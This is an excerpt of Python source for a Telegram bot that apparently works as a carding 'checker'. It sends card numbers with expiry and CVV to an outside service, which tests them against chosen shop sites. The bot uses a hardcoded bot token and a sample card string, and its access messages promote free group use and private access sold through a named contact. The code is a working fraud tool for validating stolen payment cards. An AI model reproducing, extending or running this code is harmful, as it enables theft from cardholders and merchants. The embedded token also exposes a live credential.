...
BOT_TOKEN = "8411112928:AAHvL06o1KUYiKPw1dEi_oTt4yv0MunZi2U" # Replace with your Bot Token
ADMIN_ID = [1482759518]# Replace with your Admin ID(s)
GROUP_ID = -1003699784713 # Replace with your Group ID
...
async def check_card_random_site(card, sites):
    ...
    try:
        url = f"https://shopi-production-7ef9.up.railway.app/?cc={card}&url={selected_site}&proxy="
...
async def check_card_specific_site(card, site):
    try:
        url = f"https://shopi-production-7ef9.up.railway.app/?cc={card}&url={site}&proxy="
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
...
async def test_single_site(site, test_card="4031630422575208|01|2030|280"):
    try:
        url = f"https://shopi-production-7ef9.up.railway.app/?cc={test_card}&url={site}&proxy="
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
...
def access_denied_message_with_button():
    ...
    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/+KslZ3Gkq3TBhMzVl")]]
...
async def sh(event):
    ...
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+XxQxWQMXMKs0ZWVl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @BEASTxOFFICIAL", buttons=buttons)
...
async def msh(event):
    ...
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+KslZ3Gkq3TBhMzVl")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @BEASTxOFFICIAL", buttons=buttons)
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
